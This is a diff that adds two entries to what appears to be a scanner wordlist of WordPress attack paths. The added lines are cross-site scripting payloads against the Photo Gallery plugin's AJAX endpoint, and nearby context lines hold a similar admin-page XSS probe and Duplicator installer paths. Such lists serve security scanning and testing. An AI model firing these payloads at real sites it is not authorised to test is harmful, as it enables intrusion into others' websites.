@@ -188,3 +188,5 @@
 /wp-admin/admin.php?page=rps_result_batch&edit=%3Cscript%3Ealert(/XSS/)%3C/script%3E
 /wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1
 /wp-content/backups-dup-lite/dup-installer/main.installer.php?debug=1
+/wp-admin/admin-ajax.php?action=bwg_frontend_data&bwg_album_breadcrumb_0=[{%22id%22:%221%27%3E%3Cimg/src=x%20onerror=alert(1)%3E%22,%22page%22:1},{%22id%22:%221%22,%22page%22:1}]&shortcode_id=1%22%20onmouseover=alert(id)//
+/wp-admin/admin-ajax.php?action=bwg_frontend_data&gallery_type=image_browser&gallery_id=1&tag=0&album_id=0&theme_id=1&shortcode_id=1%22%20onmouseover=alert(id)//
